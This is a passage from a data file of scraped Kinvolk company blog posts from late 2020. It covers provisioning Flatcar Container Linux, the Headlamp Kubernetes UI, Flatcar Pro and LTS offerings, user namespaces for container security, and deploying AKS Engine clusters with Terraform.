can check the workflow state. WORKFLOW_ID = \"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\" watch docker exec -i deploy_tink-cli_1 tink workflow events $WORKFLOW_ID Once the workflow shows ACTION_SUCCESS , Flatcar Container Linux is installed\non the worker! Boot into Flatcar Container Linux To boot into Flatcar Container Linux we need to power off the worker machine\nthrough VirtualBox and make sure it will try to boot from its hard disk. To do that, on a new terminal we get the name of the worker machine. VBoxManage list vms | grep worker WORKER_NAME = \"vagrant_worker_1603726186937_24058\" We stop the vm. VBoxManage controlvm $WORKER_NAME poweroff And then we enable disk boot as the second boot option. VBoxManage modifyvm $WORKER_NAME --boot2 = disk And start the VM again. VBoxManage startvm --type headless $WORKER_NAME And after waiting a minute for the worker to boot, we can go back to the\nprovisioner shell and connect to the worker. ssh [email protected] # As configured in the workflow above. We should get to the Flatcar Container Linux instance. Flatcar Container Linux by Kinvolk stable (2605.6.0) [email protected] ~ $ Clean up To clean up everything, go to the deploy/vagrant directory and use\nVagrant to destroy the VMs. vagrant destroy Conclusion This blog post demonstrated how to provision Flatcar Container Linux with\nTinkerbell. While we used a Vagrant setup for simplicity, we can follow the\nsame process to provision bare metal nodes in any environment. Join the discussion in the #tinkerbell channel on the Equinix Metal Community\nSlack . For inquiries about Flatcar Container\nLinux support, please do reach us at [email protected] .", "date": "2020-10-29"},
{"website": "Kinvolk", "title": "How Giant Swarm replaced their engines mid-flight while maintaining a steady cruising altitude", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andrew Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/11/how-giant-swarm-replaced-their-engines-mid-flight-while-maintaining-a-steady-cruising-altitude/", "abstract": "Installing Linux on a new PC isn’t that hard, right? How about replacing the operating system across a fleet of thousands of virtual machines across multiple clouds and on-premises installations, with major global enterprise customers relying on you to keep their infrastructure running 24x7? This was the challenge that faced Giant Swarm as they realized CoreOS Container Linux, on which their managed Kubernetes service was based, had been declared end of life — and decided to migrate to Flatcar Container Linux, with the help of Kinvolk. With responsibility for the production clusters of high-profile customers such as Adidas, Shutterstock, and Vodafone, they couldn’t get this wrong. A couple of weeks ago, I had the opportunity to share a virtual stage with Salvo Mazzarino of Giant Swarm, telling the story of how they decided on their migration strategy, the challenges of implementing it across multiple clouds including AWS, Azure and on-prem (KVM), and the lessons learned from the process. “We embraced CoreOS already in 2015. The reason why we did this was because we needed an immutable infrastructure,” said Salvo during the meetup. “Once CoreOS announced end of life, we needed to find another way… We said goodbye to CoreOS and the graph [of Flatcar deployments] is now at 100%… This was possible thanks to the great sponsorship that we have together with Kinvolk.” See the video of our presentation to find out all the gory details of the migration process – and many thanks to the lovely Software Circus folks for inviting us to their meetup ! Image created using free vectors by Vecteezy", "date": "2020-11-05"},
{"website": "Kinvolk", "title": "Shining a light on the Kubernetes User Experience with Headlamp", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Joaquim Rocha\n    \n    \n    /\n    \n    \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/11/shining-a-light-on-the-kubernetes-user-experience-with-headlamp/", "abstract": "If you’ve ever seen a Kubernetes demo, it probably involved a terminal and someone typing commands using kubectl and arcane yaml configuration files. This might be a powerful workflow for experts, but in an age when everything has a slick web interface, it is not the most accessible user experience. It steepens the learning curve for those new to Kubernetes, and presents a barrier to occasional users. Of course, there are several graphical user interfaces available for Kubernetes, including the Kubernetes Dashboard project that is part of upstream Kubernetes itself. However, when we researched the landscape, we couldn’t find a solution that covered everything we were looking for. Specifically, our criteria were: 100% open source Actively maintained Generic, in the sense of not being tied to a specific vendor’s Kubernetes distro Modular and extensible Clean, modern user interface Implemented using a stack that was familiar to our development team (Go, Javascript/Typescript, React) An interactive UI that allows read-write operations, not just a read-only dashboard Multi-cluster. Despite the good number of alternatives, the reality is that none of the solutions we tested at the time really matched all the points in our criteria or was a good base to start from. So, in the time-honored tradition, we decided to build one ourselves… Introducing Headlamp Today, I am proud to announce the general availability of a new UI for Kubernetes : Headlamp . Headlamp is a generic and extensible Kubernetes UI that meets the criteria mentioned above. Of course, coming from Kinvolk, it is 100% open source. We hope many Kubernetes community members will not just enjoy using Headlamp, but also contribute back to the project. Let’s take a quick spin through some of its core features. Extensible UI We want Headlamp to be used for as many different use-cases as possible. That includes not only novice Kubernetes users, but also experienced operators, as well as Kubernetes vendors with very different needs. Often, particularly for UI projects, such a breadth of use cases can only be addressed by downstream users maintaining their own fork. But keeping forks up to date becomes more challenging the deeper the changes are. A solution to this problem is to have a plugin system. So Headlamp supports out-of-tree UI plugins: Javascript files that are loaded by Headlamp’s backend and passed to the client which dynamically loads them. This opens up Headlamp to innovation, fostering a wealth of new functionality . For example, if you want to add a button to the Pod details view that will redirect the user to a service showing how much the Pod is costing to operate, that should be easy to implement. We see Headlamp’s plug-in capabilities as a great opportunity for the community. We are eager to collaborate with others who want to develop new Headlamp plugins, or enhance the plugin system itself to support other use-cases. Traceloop As an example of the power of the plug-in system , and an incredibly useful tool in its own right, we have developed a Headlamp plugin for the traceloop gadget of our Inspektor Gadget project. When Inspektor Gadget is installed in a cluster and the traceloop gadget is enabled, it records all syscalls from a pod into a ring buffer. This buffer can be seen in real-time as the pod is running, allowing a lens into what the pod is doing right now, but is also saved for terminated pods. This allows operators to see what caused a crash, after it happens – like a “flight data recorder” for your Kubernetes apps. Role-aware UI One problem with many read-write (CRUD) user interfaces is that they are not aware of underlying access controls. For example, displaying the update/delete buttons is misleading if the user has actually no permissions to modify the resource. So Headlamp checks Kubernetes RBAC settings and displays only those controls whose actions can be performed. So, if the user does not have permission to edit a resource, the edit button will not be displayed. This results in a much better UX, because it is obvious to the operator what actions are available based on their permissions at the time. In particular, this is great for situations where time-limited credentials are granted to operators (e.g. temporary deletion permissions on a resource). Pod when the user has update/delete permissions Pod when the user has no update/delete permissions Design / User Interface We wanted Headlamp’s design to be as clean and modern as possible, yet without breaking with a more “traditional” Kubernetes UI or dashboard style. For example, we think that showing a familiar table-based view is very helpful, and we hope other visualizations, such as a graph-based representation of the cluster, can be implemented through plugins. To implement Headlamp’s frontend, we chose to use React with the Material UI library, because it is modern, clean, and is well maintained with a large user community. It also has the advantage that it is the same technology stack that we use in our Nebraska project, enabling sharing of expertise and resources, and supporting a consistent UI across all our products. Desktop vs In-cluster Most Kubernetes UIs can be categorized as either a hosted (often in-cluster) backend, such as the original Kubernetes Dashboard, or a local desktop application, such as VMware’s Octant project. Both approaches have their advantages and disadvantages. For example, when run as a hosted application, it’s very simple to just share a URL with users, and have them log in through OIDC. It’s available “everywhere”, and it’s easy to keep it up-to-date with the cluster version. Conversely, with a desktop application, there’s no need to host the UI application, keeping things more isolated, but the burden of keeping the app up to date falls on the user. With Headlamp, you don’t have to choose between these two approaches, as we support both. It can be easily hosted in-cluster by using/adapting the YAML files we provide, or installed locally on Linux, Mac, and Windows. Multi-cluster support Most Kubernetes deployments involve multiple clusters, even if that’s just to separate a development from a production environment. Thus, Headlamp allows you to access all your clusters - with the exact method depending on whether you’re running as a hosted, or a local (desktop), application. When run locally, Headlamp will read the kube config and display the contexts available there, allowing the user to change when needed just by setting the local environment variable to the appropriate cluster. The way the multi-cluster support works is straightforward: it creates a proxy for each configured cluster, and redirects requests from the UI (with the Kubernetes API calls) to the right cluster address. Shout-out here to the K8dash project, whose request/API management modules we reused in the development of Headlamp. It’s also possible to mix this with running in-cluster, though this does require the cluster running the application to have API access to the other configured clusters. Relationship to Lokomotive Kubernetes You may be aware that Kinvolk also has a Kubernetes distribution, Lokomotive . While Headlamp is of course used within Lokomotive as the basis for its web user interface, it is important to note that these are separate and independent projects. True to our goal of being independent of any particular distro, Headlamp is designed to support any conformant Kubernetes cluster . Shine Headlamp on your cluster!! It’s easy to try out Headlamp : just apply the deployment manifest to your cluster and point your browser to the Headlamp service, or download and install the desktop application for Windows, Mac, or Linux. For details, see the documentation . Headlamp is fully open source, released under the Apache 2.0 terms and, as mentioned above, we created it to be a generic and vendor-independent Kubernetes UI that we hope can suit many use-cases. So we encourage anyone interested to take part. If you want to participate, please check out our contribution guidelines . We hope you enjoy Headlamp!", "date": "2020-11-16"},
{"website": "Kinvolk", "title": "Expanding Flatcar Container Linux Offerings for Enterprise and Cloud", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/11/expanding-flatcar-container-linux-offerings-for-enterprise-and-cloud/", "abstract": "To coincide with the first day of KubeCon North America , we are excited to share that we are expanding the family of Flatcar Container Linux distributions, with Flatcar Container Linux Pro and Long-Term Support (LTS) editions, as well as cloud marketplace availability of Flatcar in Azure, AWS, and Google Cloud . With hundreds of millions of usage hours across in the last six months alone, Flatcar has built upon its CoreOS heritage to establish itself as the Kubernetes community’s favorite container-optimized Linux distribution . The new commercially-supported Pro and LTS offerings complement free versions of Flatcar in Microsoft Azure, AWS, and Google Cloud Platform Marketplaces, expanding the options available to users seeking a secure, automatically updating operating system optimized for containers running in the cloud. “When we launched Flatcar, we had no idea that it would become as popular as it did,” said Chris Kühl, chief executive officer at Kinvolk. “We just knew that it was the right model for deploying containers, and it seems that the community agreed. Now, as enterprise users are asking for capabilities beyond the needs of the original open source community, it just made sense to expand our offerings to support those customers as well.” Flatcar Container Linux Pro: Optimized for Cloud Flatcar Container Linux Pro is a marketplace-delivered, cloud-optimized version of Flatcar, initially available for Microsoft Azure with releases planned for AWS and Google Cloud Platform. The exact set of features will depend on the target cloud platform. As an example, Flatcar Container Linux Pro for Azure, available today in Azure Marketplace , includes the following. An Azure-tuned kernel (initially based on the 5.4 Linux release), with all the configuration options, patches and modules required for optimized performance on Azure, as specified by the Microsoft Azure Linux team. Support for Azure Accelerated Networking , thanks to included single root I/O virtualization (SR-IOV). Built-in drivers for all Azure GPU-enabled instances , enabling access to accelerated graphics hardware for workloads such as machine learning. (Planned availability end of this week.) HyperV telemetry , enabling reporting of boot-time and other issues through the hypervisor for ease of troubleshooting and support. (Planned availability early December.) Optional Federal Information Processing Standards (FIPS) encryption modules, to enable organizations to meet regulatory security compliance requirements. (Planned availability in December.) In addition, Flatcar Container Linux Pro comes with commercial support from Kinvolk . Flatcar Container Linux LTS: Enterprise Stability and Compliance To meet the needs of customers who prioritize platform security and long-term stability, the new Flatcar Container Linux Long-Term Support (LTS) edition offers a guaranteed minimum 18 month support life-cycle . This compares with a typical two month refresh cadence for the community Stable channel, and even more frequent Alpha and Beta channel updates. Each Flatcar LTS release will be based on an LTS upstream kernel, and will be kept up-to-date with critical patch fixes including for security vulnerabilities, but will not receive new Flatcar features or major component version updates, ensuring maximum stability for applications while simplifying operations and maintaining security compliance. In addition to its extended support life-cycle, Flatcar Container Linux LTS includes enhanced functionality from the Pro edition, including support for FIPS. Flatcar (free version) available in Azure, AWS and GCP Marketplaces Until now, while Kinvolk has distributed images for all major cloud platforms, users had to manually deploy those images into their accounts. Now, with support for all three major cloud marketplaces — Azure , AWS , and Google Cloud — finding and deploying Flatcar Container Linux could not be easier. And, as always, Flatcar is free. Learn more at KubeCon Several Kinvolk colleagues will be presenting on the topic of Linux for container environments at KubeCon this week. Building Linux Distributions for Fun and Profit , with Marga Manterola, Staff Software Engineer Panel: Linux in the Kubernetes Era: Does The OS Still Matter? , with Vincent Batts, Chief Technical Officer Beyond the Buzzword: BPF’s Unexpected Role in Kubernetes , with me (Andy Randall) and Alban Crequy, co-founder and director of Kinvolk Labs We hope to see you at one of these sessions, or in the #kubecon-hallway !", "date": "2020-11-17"},
{"website": "Kinvolk", "title": "Upgrade Your Azure Instances to Flatcar Container Linux Pro", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    /\n    \n    \n  \n    \n    \n      Thilo Fromm\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/12/upgrade-your-azure-instances-to-flatcar-container-linux-pro/", "abstract": "Recently, we introduced a new offer into the Flatcar Container Linux line-up, the Pro edition of Flatcar. Available in the Azure Marketplace , Flatcar Pro offers a number of advantages over the free community edition of Flatcar, including: Azure-Tuned Linux Kernel , optimally configured for Azure out of the box. Commercial Support : in the event of any issues, the Kinvolk support team is standing by and ready to help, working closely with our counterparts in Microsoft. Highest possible network performance, thanks to Azure Accelerated Networking support. Built-in drivers for all Azure GPU-enabled instance types , enabling access to accelerated graphics hardware for workloads such as machine learning. HyperV telemetry , enabling reporting of boot-time and other issues through the hypervisor for ease of troubleshooting and support. Optional support for Federal Information Processing Standards (FIPS) , to enable organizations to meet security compliance requirements. If you are already using the (non-Pro) version of Flatcar Container Linux, and would like to upgrade to Pro, you will need to reprovision your instances using the new Marketplace offer ID. An in-place migration is unfortunately not possible, but reprovisioning should be straightforward. Below, we provide some guidance depending on how you provisioned your machines in the first place: Using the Azure Web portal Using Terraform Using the az command line tool (for example, in a shell script) Using Azure Resource Manager (ARM) templates Please try it out, and let us know how you get on! Deploy Flatcar Container Linux Pro from the Azure web portal To deploy directly from the web portal start page: Select “Create a resource” from the portal start page. This will direct you to the “new resource” page. In the search box, enter “ Flatcar Container Linux Pro”. You will be directed to our Marketplace product page. On the product page, click “create”. This will start the regular virtual machine creation wizard where you can pick a region, configure machine and storage size, peripherals, etc. Finish the wizard to launch your Pro instance. To deploy from the web portal’s “Virtual Machines” section: Select “Add” → “Virtual machine”. This will direct you to the virtual machine creation wizard. Under “Instance details” / “Image”, click “Browse all public and private images. This will open a search box. In the search box, enter “ Flatcar Container Linux Pro”. Select the first item, “Flatcar Container Linux Pro (Stable)”. Finish the instance config via the wizard to launch your Pro instance. Update your Terraform-based deployment to use Flatcar Container Linux Pro If you are using Terraform to automatically deploy Flatcar Container Linux, find the storage_image_reference section in your Terraform script. It should look something like this: storage_image_reference {\n        publisher = \"kinvolk\"\n        offer     = \"flatcar-container-linux\"\n        sku       = \"stable\"\n        version   = \"latest\"\n    } Change the offer from “flatcar-container-linux” to “flatcar_pro”, and your script should look like this: storage_image_reference {\n        publisher = \"kinvolk\"\n        offer     = \"flatcar_pro\"\n        sku       = \"stable\"\n        version   = \"latest\"\n    } Please note that the change only takes effect for newly deployed instances. Deploy Flatcar Container Linux Pro using the az CLI To deploy using the az command line tool , for example in a shell script: List the images available to retrieve the URN. The latest version will be listed last (the exact URN may differ from what is shown here): $ az vm image list –all -p kinvolk -f flatcar_pro -s stable [ … { “offer”: “flatcar_pro”, “publisher”: “kinvolk”, “sku”: “stable”, “urn”: “kinvolk:flatcar_pro:stable:2605.7.0”, “version”: “2605.7.0” } ] Use the above URN in place of the “kinvolk:flatcar-container-linux” URN, wherever you currently use the az command line. You can specify you custom ignition config via the –custom-data parameter: $ az vm create --name node-1 --resource-group group-1 \\\n--admin-username core --custom-data \"$(cat config.ign)\" \\\n--image kinvolk:flatcar_pro:stable:2605.7.0 Update your ARM template to use Flatcar Container Linux Pro If you are using ARM templates to automatically deploy Flatcar Container Linux, find the imageReference section in your template. It should look something like this: \"storageProfile\": {\n          \"imageReference\": {\n            \"publisher\": \"kinvolk\",\n            \"offer\": \"flatcar-container-linux\",\n            \"sku\": \"stable\",\n            \"version\": \"latest\"\n          }, Change the offer from “flatcar-container-linux” to “flatcar_pro”, and your template should look like this: \"storageProfile\": {\n          \"imageReference\": {\n            \"publisher\": \"kinvolk\",\n            \"offer\": \"flatcar_pro\",\n            \"sku\": \"stable\",\n            \"version\": \"latest\"\n          }, Please note that the change only takes effect for newly deployed instances.", "date": "2020-12-02"},
{"website": "Kinvolk", "title": "Improving Kubernetes and container security with user namespaces", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/12/improving-kubernetes-and-container-security-with-user-namespaces/", "abstract": "Improving Kubernetes and container security with user namespaces Author: Alban Crequy In this blog post, I will introduce user namespaces, explain why they are useful for containers and how they interact with Linux capabilities and filesystems. Then, I will explain the work we’ve done on two user namespace projects with Netflix: adding unprivileged user namespace support to FUSE and current work we’re doing to enable user namespaces in Kubernetes. What are user namespaces? User namespaces and capabilities User namespaces and filesystems Impact on container security Enabling user namespaces for FUSE filesystems Bringing user namespaces to Kubernetes CRI changes for user namespaces Kubernetes volumes Conclusion What are user namespaces? Containers on Linux are not a first-class concept, instead they are built upon namespaces, cgroups and other Linux primitives. The Linux API offers different kinds of namespaces and they each isolate a specific aspect of the operating system. For example, two containers in different network namespaces will not see each other’s network interfaces. Two containers in different PID namespaces will not see each other’s processes. User namespaces are similar: they isolate user IDs and group IDs from each other. On Linux, all files and all processes are owned by a specific user id and group id, usually defined in /etc/passwd and /etc/group. A user namespace can be configured to let a container only see a subset of the host’s user IDs and group IDs. In the example below, the two containers are configured to use distinct sets of user IDs, offering more isolation between themselves and between the containers and the host. Processes and files in container 1 of the example might have the illusion of being root (user id 0), but are in fact using user id 100000 on the host. User namespaces and capabilities This possibility to appear as user “ root ” in the container but, in fact, be another user is an important feature of user namespaces. To go in more details about this, let me first sum up the history of this feature in the Linux kernel: Before Linux 2.2, there was one user, “ root ” with user id 0, who could do privileged operations like configuring the network and mounting new filesystems. Regular users couldn’t do those privileged operations. Since Linux 2.2, the privileges from the “root” user are split into different capabilities , e.g. CAP_NET_ADMIN to configure the network and CAP_SYS_ADMIN to mount a new filesystem. Linux 3.8 introduced user namespaces in 2013 and, with it, capabilities are no longer global but interpreted in the context of a user namespace. As an example of what that means, we’ll consider the scenario where a container executes the program “ sshfs ” to mount a ssh filesystem using fuse. Mounting a filesystem requires the capability CAP_SYS_ADMIN . This is not something normally granted to containers as it would give them too much power and defeats the purpose of isolation between the host and container. When a container is set up without a new user namespace, the only way to allow it to execute “ sshfs ” successfully is to give CAP_SYS_ADMIN to it, which is unfortunate due to the negative security implications discussed above—even though “ sshfs ” does not want to impact the host. But when the container is using a new user namespace, it can be given CAP_SYS_ADMIN in that user namespace without having CAP_SYS_ADMIN on the host user namespace. Being “root” (user id 0) in the container does not impact the host because the real user id is not root on the host. More precisely, to mount a filesystem in the mount namespace of the container requires the process to have CAP_SYS_ADMIN in the user namespace owning that mount namespace. User namespaces and filesystems From the explanation above, it looks like thanks to user namespaces, it is possible to allow containers to mount filesystems without being root on the host. But depending on the filesystem, there are more pieces that come into play. Linux keeps a list of filesystems deemed safe for mounting in user namespaces, marked with the FS_USERNS_MOUNT flag . Creating a new mount in a non-initial user namespace is only allowed with those filesystem types. You can find the list in the Linux git repository with: git grep -nw FS_USERNS_MOUNT As you can see in the table below, new filesystem mounts in non-initial user namespaces were initially restricted to only procfs and sysfs, and then more and more filesystems were allowed along the years to be mounted in user namespaces. This is because it takes time to ensure that a filesystem is safe to use by unprivileged users. filesystem Allowed in user namespaces? ( FS_USERNS_MOUNT flag ) Procfs, sysfs Yes, since Linux 3.8, 2012 ( 4f326c0064b20 ) tmpfs Yes, since Linux 3.9, 2013 ( b3c6761d9b5cc ) cgroupfs Yes, since Linux 4.6, 2016 ( 1c53753e0df1a ) FUSE filesystem Yes, since Linux 4.18, 2018 ( 4ad769f3c346 ), or sooner on Ubuntu kernels overlay filesystem Yes, for (Linux 5.11 , 2020, and sooner on Ubuntu kernels ( patch )) NFS, ext4, btrfs, etc. No Impact on container security User namespaces is another layer of security that isolates the host from the container. There has been a series of container vulnerabilities that were mitigated with user namespaces and it would be safe to assume that future vulnerabilities would be mitigated as well. As an example, there was CVE-2019-5736 ( fix in runc ) where the host runc binary could be overwritten from the container. The announcement of the vulnerability mentions that using user namespaces is one of the possible mitigations. This is because even though the vulnerability allows a process in the container to have a reference to runc on the host via /proc/self/exe, the runc binary would be owned by a user ( root ) that is not mapped in the container. The container would perceive runc as belonging to the special user “ nobody ” and the “ root ” user in the container would not have write rights on it. We had a blog post explaining the details of the issue and how Flatcar Container Linux mitigated it in a different way, by using a read-only filesystem for hosting the runc binary. The diagram below shows the sequence of steps used by runc to create a container, and how the /proc/self/exe can be a reference to runc. For more details about how that works, see our blog post . The Kubernetes User Namespaces KEP ( KEP/127 ) lists a couple of other vulnerabilities that can be mitigated with user namespaces. Enabling user namespaces for FUSE filesystems Before Linux 4.18, FUSE was not allowed in user namespaces but the effort to make it work was mostly complete: Ubuntu kernels already had a patch set to support it. The missing part for Linux upstream was proper integration with the integrity subsystem, IMA (Integrity Measurement Architecture). On Linux systems that use IMA, the kernel can detect if files are modified before allowing processes to read or execute them. It enables an audit trail of what is executed. It can also enable the Linux Extended Verification Module (EVM) to enforce a policy to only execute programs if their content is known to be good or signed by a trusted encryption key. As opposed to files stored on a local hard disk with a traditional filesystem, files on filesystems such as FUSE can be modified without the kernel being able to re-measure, re-appraise, and re-audit files before being served. We wrote a patch on the memfs FUSE driver to demonstrate the following problem in this scenario: On the first request, the FUSE driver serves a file with its initial content. IMA provides a measurement of the file. On the second request, the FUSE driver serves the same file with an altered content. IMA does not measure the content again so the altered content is not measured. At the time, there was a patch in discussion attempting to fix the issue with a “ force ” option in IMA that would force IMA to always re-measure, re-appraise, and re-audit files based on a policy, for example all files served by FUSE. We tested the effectiveness of that patch. We sent several patch sets to explore different options. The first option explored was to patch IMA so that it recognises FUSE filesystems as special and use the “ force ” option on them, so the measurements are performed for each request, even if the kernel didn’t detect any changes. We received the review that the IMA subsystem should not have to know the different filesystems in order to behave differently in the case of FUSE. Indeed, other filesystems could have the same issue such as remote filesystems. With this option, IMA needs to know about the behaviour of all filesystems, and it is putting this knowledge at the wrong layer. In order to solve this, the second option explored was to introduce a new filesystem flag FS_NO_IMA_CACHE ( v1 , v2 , v3 , v4 ) that allows filesystems to announce to the IMA subsystem their own behaviour with regard to caching. The IMA subsystem can then check the flag and use the “ force ” option if the flag is present. In that way, the IMA subsystem does not need to know about the different filesystems. However, the IMA “ force ” option does not solve all the issues and signatures still can’t be verified meaningfully. In the end, the following solution was implemented in Linux 4.17 by IMA maintainers: Add a new flag SB_I_IMA_UNVERIFIABLE_SIGNATURE that filesystems can use to announce to IMA that their signatures cannot be verified. Right now, only FUSE filesystems make use of this flag. For more security, IMA users can use the IMA policy “fail_securely” that makes IMA signature verification on FUSE filesystems fail even without a user namespace. Add another new flag SB_I_UNTRUSTED_MOUNTER that filesystems can use when  they are mounted from a user namespace that cannot be trusted. In that case, the IMA measurement would fail. After this IMA fix in Linux 4.17, FUSE filesystems in a non-initial user namespace are finally allowed in Linux 4.18. Bringing user namespaces to Kubernetes Although user namespaces are supported in OCI container runtimes like runc, this feature is not available in Kubernetes. Ongoing, unsuccessful, efforts in Kubernetes to add user namespace support date back to 2016 starting with this enhancement issue . At the time of this first attempt, Kubernetes had already introduced the Container Runtime Interface (CRI) but it was not yet the default. Nowadays, however, the Kubelet communicates with the container runtime via the CRI’s gRPC interface and is the main target to introduce support for user namespaces. The diagram above shows different architectures for the Kubelet’s communication with the container runtimes: The old way: the Kubelet talks to Docker directly to start containers using the Docker API (deprecated) The new way: the Kubelet talks to the container runtime via the CRI’s gRPC interface. The container runtime might have a “CRI shim” component that understands the CRI protocol. The new way when using containerd as the container runtime: containerd is compiled with containerd/cri to understand the CRI protocol. They receive CRI commands from the Kubelet and start containers using runc and the OCI runtime spec. CRI changes for user namespaces The exact changes in the CRI to support user namespaces are still in discussion. But the general idea is the following: The Kubelet asks the container runtime to start the “pod” sandbox with the RunPodSandbox() method. This will create a “sandbox” container (also known as the “infrastructure” container) that will hold the shared namespaces among the different containers of the pod. The user namespace will be configured at this stage with specific uid and gid mappings, as you can see in the OCI runtime configuration given to runc. Then, the Kubelet will call the method CreateContainer() for each container of the pod with a reference to the sandbox previously created. The OCI runtime configuration will specify to reuse the user namespace of the sandbox. In this way, the user namespace will be shared by the different containers in the pod. The IPC and network namespaces are also shared at the pod level, allowing the different containers to communicate with each other using IPC mechanisms and with the network loopback interface respectively. The IPC network and network namespace are owned by the user namespace of the pod, allowing the capabilities of those namespace types to be effective in the pod but not on the host. For example, if a container is given CAP_NET_ADMIN in the user namespace, it will be allowed to configure the network of the pod but not of the host. If a container is given CAP_IPC_OWNER , it can bypass the permissions of IPC objects in the pod but not on the host. The mount namespace in each container is also owned by the pod user namespace. Thus, if a container is given CAP_SYS_ADMIN , it will be able to perform mounts in its mount namespace but that capability will not be effective for the host mount namespace because the host mount namespace is not owned by the user namespace of the pod. Kubernetes volumes A big challenge for user namespaces in Kubernetes is support for volumes. I mentioned in the introduction that different containers should ideally have different sets of user IDs so that they have better isolation from each other. But it introduces a problem when the different containers need to access the same volumes. Consider the scenario below: Container1 writes files on a NFS share. The files belong to the user ID 100000 because that’s the user mapped in the container. Container2 reads the files from the NFS share. Since the user ID 100000 is not mapped in the container 2, the files are seen as belonging to the pseudo user id 65534, special code for “ nobody ”. This can introduce a file access permission problem. There are different possibilities to address this problem: Use the same user id mapping for all pods. This reduces the isolation between containers, although this would still provide better security than the status quo without user namespaces. The files on the volume would be owned by a user id such as 100000 and administrator would need to take care that the user id mapping in the Kubernetes configuration does not change during the lifetime of the volume. Use different user id mappings for each pod but use an additional mechanism to convert the user id of files on the fly. There are different kernel mechanisms in the works providing that: shiftfs , fsid mappings or new mount API in the Linux kernel. But so far, none of those solutions are ready in Linux upstream. Our current proposal makes it possible to use the first possibility and it could be extended later when a better solution arises. Note that there are plenty of workloads without volumes that would benefit from user namespaces today, so not having a complete solution today should not block us from incrementally implementing user namespaces in Kubernetes. Conclusion User namespaces is a Linux primitive that is useful for providing an additional layer of security to containers. It has proven to be a useful mitigation in several past vulnerabilities. Although it still suffers for some shortcomings with volumes support, Linux kernel development is active in that area. I expect future improvements to build on the improvements that have been made over the last years. We’re proud to contribute to that community effort in Kubernetes. Once Kubernetes support for user namespaces is complete, Kubernetes will gain a better security isolation between container workloads and the Linux hosts. It will also open the door for new use cases of running containers with more privileges, something that is today — without user namespace support — too dangerous to do.", "date": "2020-12-23"},
{"website": "Kinvolk", "title": "Supercharging AKS Engine with Flatcar Container Linux", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Iago López Galeiras\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/12/supercharging-aks-engine-with-flatcar-container-linux/", "abstract": "AKS Engine is a powerful open source tool to deploy and manage a Kubernetes\ncluster on Microsoft Azure. While it is best known as the foundation of\nMicrosoft’s own managed Azure Kubernetes Service (AKS), it is also used\ndirectly by users who want more control over their clusters. For example, while AKS is restricted to using Ubuntu or Windows, AKS Engine\nallows you to specify other operating systems at install time. Why would you\nwant to do that? Well, to get the benefits of a minimal, immutable,\ncontainer-optimized Linux like Flatcar Container\nLinux : increased security and manageability at scale reduced attack surface area auto-updates with the latest patches optimized for Azure and Kubernetes. Indeed, the National Institute of Standards and Technology (NIST) advises the\ndeployment of containerized applications on container-optimized OS like\nFlatcar: “Whenever possible, organizations should use these minimalistic OSs to\nreduce their attack surfaces and mitigate the typical risks and hardening\nactivities associated with general-purpose OSs.” So you’re convinced and want to get started? In the rest of this blog, we’ll\ndig into how to deploy a Kubernetes cluster using AKS Engine, with Flatcar\nContainer Linux as the base operating system for its worker nodes. Authenticate to Azure The first step to deploying an AKS Engine cluster is to authenticate to Azure.\nFollow the instructions to install the\nAzure CLI and sign\nin to your\nAzure account. Download aks-engine binary Download and extract the latest release of AKS engine from the GitHub releases\npage , at the time of writing it\nwas v0.57.0: wget https://github.com/Azure/aks-engine/releases/download/v0.57.0/aks-engine-v0.57.0-linux-amd64.tar.gz\ntar xvf aks-engine-v0.57.0-linux-amd64.tar.gz Install Terraform To make this blog post reproducible we use Terraform to create the needed Azure resources.\nFollow the instructions to download\nand install it. Create service principal and resource group To deploy an AKS engine cluster, you need to create a resource\ngroup where the cluster resources live and a service\nprincipal to access the resources. We do this as follows. Note : creating a service principal is a privileged\noperation so you might have to contact your Azure Active Directory admin to\ncreate one. Create a file named azure-setup.tf with the following contents: # providers provider \"azurerm\" { features {}\n} terraform {\n  required_version = \"> = 0 . 13 \" required_providers {\n    azurerm = {\n      source = \"hashicorp/azurerm\" version = \"2.38.0\" }\n    azuread = {\n      source = \"hashicorp/azuread\" version = \"1.1.1\" }\n    random = {\n      source = \"hashicorp/random\" version = \"3.0.0\" }\n  }\n} # variables variable \"subscription_id\" {} variable \"resource_group_location\" {} variable \"cluster_name\" {} # resources resource \"azuread_application\" \"aks_engine_cluster\" {\n  name = var . cluster_name } resource \"azuread_service_principal\" \"aks_engine\" {\n  application_id = azuread_application . aks_engine_cluster . application_id } resource \"azurerm_resource_group\" \"resource_group\" {\n  name = var . cluster_name location = var . resource_group_location } resource \"random_string\" \"password\" {\n  length = 16 special = true override_special = \"/@\\\"\" } resource \"azuread_application_password\" \"ad_password\" {\n  application_object_id = azuread_application . aks_engine_cluster . object_id value = random_string . password . result end_date_relative = \"86000h\" } resource \"azurerm_role_assignment\" \"main\" {\n  scope = \"/subscriptions/${var.subscription_id}\" role_definition_name = \"Contributor\" principal_id = azuread_service_principal . aks_engine . id } # outputs output \"client-id\" {\n  value = azuread_application . aks_engine_cluster . application_id } output \"client-secret\" {\n  value = azuread_application_password . ad_password . value } Before running Terraform we need to define 3 variables: subscription_id : The ID of your Azure Subscription. You can see your\nexisting Azure subscriptions and their IDs in the Azure\nPortal . resource_group_location : The region where the cluster is deployed, for\nexample norwayeast . You can get a list of locations available to your\naccount by running az account list-locations -o table . cluster_name : The name of your cluster. Define them as environment variables as they are needed in several commands: export TF_VAR_subscription_id = 11111111-2222-3333-4444-555555555555 export TF_VAR_resource_group_location = norwayeast export TF_VAR_cluster_name = test-flatcar-cluster Next, run Terraform: terraform init\nterraform apply When Terraform is finished it outputs the client-id and client-secret variables. They will be used later so store them in environment variables 